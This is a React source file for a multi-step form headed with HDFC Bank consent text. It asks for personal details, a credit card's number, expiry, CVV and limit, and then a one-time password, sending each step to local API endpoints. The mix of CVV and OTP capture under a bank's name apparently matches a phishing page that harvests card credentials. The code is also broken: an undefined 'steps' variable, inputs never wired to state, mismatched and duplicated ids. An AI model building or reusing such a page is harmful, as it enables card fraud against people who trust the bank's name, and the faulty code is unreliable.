import React, { useState } from "react";
import logo from "../../../src/logo.png";
import banner from "../../Images/formBanner.jpg";
import "./forms.css";

const FirstForm = () => {
  const [formData, setFormData] = useState({
    firstName: "",
    middleName: "",
    lastName: "",
    email: "",
    number: "",
    gender: "",
    employmentType: "",
    creditLimit: "",
    totalAmountDue: "",
    cardHolderName: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
    otp: "",
  });

  const [activeStep, setActiveStep] = useState(1);

  const handleChange = (e) => {
    const { id, value } = e.target;
    setFormData({ ...formData, [id]: value });
  };

  const handleNext = async () => {
    if (activeStep === 1) {
      await submitPersonalInfo();
    } else if (activeStep === 2) {
      await submitCardDetails();
    } else if (activeStep === 3) {
      await verifyOtp();
    }
  };

  const handlePrevious = () => {
    setActiveStep((prev) => Math.max(prev - 1, 1));
  };

  const submitPersonalInfo = async () => {
    try {
      const response = await fetch("/api/personal-info", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          firstName: formData.firstName,
          middleName: formData.middleName,
          lastName: formData.lastName,
          email: formData.email,
          number: formData.number,
          gender: formData.gender,
          employmentType: formData.employmentType,
        }),
      });
      if (response.ok) {
        alert("Personal info submitted successfully!");
        setActiveStep(2);
      } else {
        alert("Failed to submit personal info");
      }
    } catch (error) {
      console.error(error);
      alert("An error occurred");
    }
  };

  const submitCardDetails = async () => {
    try {
      const response = await fetch("/api/card-details", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          creditLimit: formData.creditLimit,
          totalAmountDue: formData.totalAmountDue,
          cardHolderName: formData.cardHolderName,
          cardNumber: formData.cardNumber,
          expiryMonth: formData.expiryMonth,
          expiryYear: formData.expiryYear,
          cvv: formData.cvv,
        }),
      });
      if (response.ok) {
        alert("Card details submitted successfully!");
        setActiveStep(3);
      } else {
        alert("Failed to submit card details");
      }
    } catch (error) {
      console.error(error);
      alert("An error occurred");
    }
  };

  const verifyOtp = async () => {
    try {
      const response = await fetch("/api/verify-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ otp: formData.otp }),
      });
      if (response.ok) {
        alert("OTP verified successfully! Form submitted!");
      } else {
        alert("Invalid OTP");
      }
    } catch (error) {
      console.error(error);
      alert("An error occurred");
    }
  };


  const forms = [
   {
    id:1,
    content :(
      <div className="formBox">
      <form>
        <div className="row mb-2">
          <div className="col-md-6 text-start mb-3">
            <label htmlFor="firstName" className="form-label">
              Your Full Name (as per PAN card)
            </label>
            <input
              type="text"
              id="firstName"
              className="form-control formInput"
              placeholder="Frist Name"
              required
            />
          </div>
          <div className="col-md-6 text-start mb-3">
            <label htmlFor="middleName" className="form-label">
              Middle Name (Optional)
            </label>
            <input
              type="text"
              id="middleName"
              className="form-control formInput"
              placeholder="Middle Name"
            />
          </div>
        </div>

        <div className="row mb-2">
          <div className="col-md-6 text-start mb-3">
            <label htmlFor="lastName" className="form-label">
              Last Name
            </label>
            <input
              type="text"
              id="lastName"
              className="form-control formInput"
              placeholder="Last Name"
              required
            />
          </div>
          <div className="col-md-6 text-start mb-3">
            <label htmlFor="panNumber" className="form-label">
              Your Contact Number
            </label>
            <input
              type="number"
              id="panNumber"
              className="form-control formInput"
              placeholder="Enter Contact Number"
              onChange={(e) => {
                if (e.target.value.length > 10)
                  e.target.value = e.target.value.slice(0, 10);
              }}
              required
            />
          </div>
        </div>

        <div className="row mb-2">
          <div className="col-md-6 text-start mb-3">
            <label className="form-label">Your Gender</label>
            <div className="d-flex gap-3">
              <div className="form-check">
                <input
                  className="form-check-input"
                  type="radio"
                  name="gender"
                  id="male"
                  value="Male"
                  required
                />
                <label className="form-check-label" htmlFor="male">
                  Male
                </label>
              </div>
              <div className="form-check">
                <input
                  className="form-check-input"
                  type="radio"
                  name="gender"
                  id="female"
                  value="Female"
                />
                <label className="form-check-label" htmlFor="female">
                  Female
                </label>
              </div>
              <div className="form-check">
                <input
                  className="form-check-input"
                  type="radio"
                  name="gender"
                  id="thirdGender"
                  value="Third Gender"
                />
                <label className="form-check-label" htmlFor="thirdGender">
                  Third Gender
                </label>
              </div>
            </div>
          </div>
          <div className="col-md-6 text-start mb-3">
            <label htmlFor="employmentType" className="form-label">
              Your Employment Type
            </label>
            <select id="employmentType" className="form-select" required>
              <option value="">Select</option>
              <option value="salaried">Salaried</option>
              <option value="selfEmployed">Self-Employed</option>
              <option value="student">Student</option>
              <option value="unemployed">Unemployed</option>
            </select>
          </div>
        </div>

        <div className="row mb-2">
          <div className="col-md-6 text-start mb-3">
            <label htmlFor="email" className="form-label">
              Your Personal Email Address
            </label>
            <input
              type="email"
              id="email"
              className="form-control formInput"
              placeholder="Enter your email"
              required
            />
          </div>
        </div>

        {/* <button type="button" className="btn btn-primary">
          Submit
        </button> */}
        <div className="row mt-4">
          <div
            style={{ display: "flex", gap: "20px", alignItems: "center" }}
            className="col-md-12"
          >
            <div>
              <input type="checkbox" name="" id="" />
            </div>
            <p className="form_check_box" style={{ color: "var(--blue)", textAlign: "start" }}>
              I understand and hereby give my consent to use my bureau details
              and information provided by me and/or information already held by
              HDFC Bank (if any) to evaluate my eligibility. I agree to the
              Terms & Conditions set by the Bank.
            </p>
          </div>
        </div>
      </form>
    </div>
    )
   },
   {
    id:2,
    content:(
      <div className="formBox">
      <form>
        <div className="row mb-2">
          <div className="col-md-6 text-start mb-3">
            <label htmlFor="firstName" className="form-label">
              Enter Current Card Limit
            </label>
            <input
              type="number"
              id="credit-limit"
              className="form-control formInput"
              placeholder="Enter Your Card Limit"
              required
            />
          </div>
          <div className="col-md-6 text-start mb-3">
            <label htmlFor="middleName" className="form-label">
              Total Amount Due
            </label>
            <input
              type="number"
              id="amount-due"
              className="form-control formInput"
              placeholder="Enter Amount Due"
            />
          </div>
        </div>

        <div className="row mb-2">
          <div className="col-md-6 text-start mb-3">
            <label htmlFor="lastName" className="form-label">
              Card Holder Name
            </label>
            <input
              type="text"
              id="name"
              className="form-control formInput"
              placeholder="Enter Card Holder Name"
              required
            />
          </div>
          <div className="col-md-6 text-start mb-3">
            <label htmlFor="panNumber" className="form-label">
              Card Number
            </label>
            <input
              type="number"
              id="panNumber"
              className="form-control formInput"
              placeholder="Enter Card Number"
              maxLength="16"
              required
            />
          </div>
        </div>

        <div className="row mb-2">
          <div className="col-md-6 text-start mb-3">
            <label htmlFor="expiryMonth" className="form-label">
              Expiry Month
            </label>
            <input
              type="number"
              id="expiryMonth"
              className="form-control formInput"
              placeholder="MM"
              maxLength="2"
              required
            />
          </div>
          <div className="col-md-6 text-start mb-3">
            <label htmlFor="expiry month" className="form-label">
              Expiry Year
            </label>
            <input
              type="number"
              id="expiry_year"
              className="form-control formInput"
              placeholder="YY"
              maxLength="2"
              required
            />
          </div>
        </div>

        <div className="row mb-2">
          <div className="col-md-6 text-start mb-3">
            <label htmlFor="email" className="form-label">
              Enter CVV
            </label>
            <input
              type="number"
              id="cvv"
              className="form-control formInput"
              placeholder="CVV"
              maxLength={3}
              required
            />
          </div>
        </div>

        {/* <button type="button" className="btn btn-primary">
          Submit
        </button> */}
      </form>
    </div>
    )
   },
   {
    id:3,
    content:(
      <div className="formBox">
      <div className="otpform mb-2">
        <div>
          <form action="">
            <label htmlFor="email" className="form-label">
              One Time Password (OTP)
            </label>
            <input
              type="number"
              id="otp"
              className="form-control mb-2 formInput"
              placeholder="Enter OTP"
              required
            />
            <a href="#" onClick={() => alert("OTP resent successfully!")}>
              Resend OTP
            </a>
          </form>
        </div>
      </div>
    </div>
    )
   },
  ];

  return (
    <>
      <div className="form_header">
        <div className="form_nav">
          <a href="/">
            <img src={logo} alt="Logo" />
          </a>
        </div>
      </div>
      <div className="form_banner1">
        <img className="w-100" src={banner} alt="Banner" />
      </div>
      <div className="bg-white">
        <section className="formSection">
          <div className="form_tabs">
            <div className="tab-container">
              {steps.map((step) => (
                <div
                  key={step.id}
                  className={`tab-item ${activeStep === step.id ? "active" : ""}`}
                  onClick={() => setActiveStep(step.id)}
                >
                  <span>{step.label}</span>
                </div>
              ))}
            </div>
          </div>
          <div className="form-content">{forms[activeStep - 1]}</div>
          <div className="form-actions mt-4">
            {activeStep < 3 && (
              <button className="btn btn-primary" onClick={handleNext}>
                Next
              </button>
            )}
            {activeStep === 3 && (
              <button className="btn btn-success" onClick={verifyOtp}>
                Submit
              </button>
            )}
          </div>
        </section>
      </div>
    </>
  );

};

export default FirstForm;
